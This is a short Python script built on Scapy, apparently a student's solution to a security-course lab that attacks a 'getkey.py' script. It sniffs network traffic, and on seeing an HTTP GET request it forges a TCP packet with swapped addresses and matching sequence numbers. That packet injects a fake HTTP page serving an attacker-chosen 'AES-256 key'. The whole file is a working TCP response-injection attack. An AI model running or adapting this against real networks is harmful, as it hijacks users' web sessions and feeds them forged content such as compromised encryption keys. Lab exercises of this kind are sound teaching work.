#!/usr/bin/python
from scapy.all import *
import socket

def inject_pkt(pkt):
#    import dnet
#    dnet.ip().send(str(pkt))
    from scapy.all import send, conf, L3RawSocket
    conf.L3socket=L3RawSocket
    send(pkt)

#######################################
## EDIT THIS FUNCTION TO ATTACK
## PROFESSOR VULN'S getkey.py SCRIPT
#######################################
def handle_pkt(pkt):
    #print pkt.encode('hex')
    if "GET / HTTP/1.1" in str(pkt):
        new_src = pkt[IP].dst
        new_dest = pkt[IP].src

        new_seq = pkt[TCP].ack
        new_ack = pkt[TCP].seq

        new_src_port = pkt[TCP].dport
        new_dest_port = pkt[TCP].sport

        offset = len(pkt[TCP].payload)

        header = "HTTP/1.1 200 OK\r\nServer: nginx/1.14.0 (Ubuntu)\r\nContent-Type: text/html; charset=UTF-8\r\nContent-Length: 335\r\nConnection: close\r\n\r\n"
        html_page = """<html>\r\n<head>\r\n\r<title>Free AES Key Generator!</title>\r\n</head>\r\n<body>\r\n<h1 style="margin-bottom: 0px">Free AES Key Generator!</h1>\r\n<span style="font-size: 5%">Definitely not run by the NSA.</span><br/>\r\n<br/>\r\n<br/>\r\nYour <i>free</i> AES-256 key: <b>4d6167696320576f7264733a2053717565616d697368204f7373696672616765</b><br/>\n</body>\r\n</html>\n"""
        payload = header + html_page

        hack_packet = IP(src = new_src, dst = new_dest)/TCP(seq = new_seq, ack = new_ack + offset, dport = new_dest_port, sport = new_src_port, flags = 'PA')/payload
        inject_pkt(hack_packet)


def main():
    sniff(filter="ip", prn=handle_pkt)

if __name__ == '__main__':
    main()
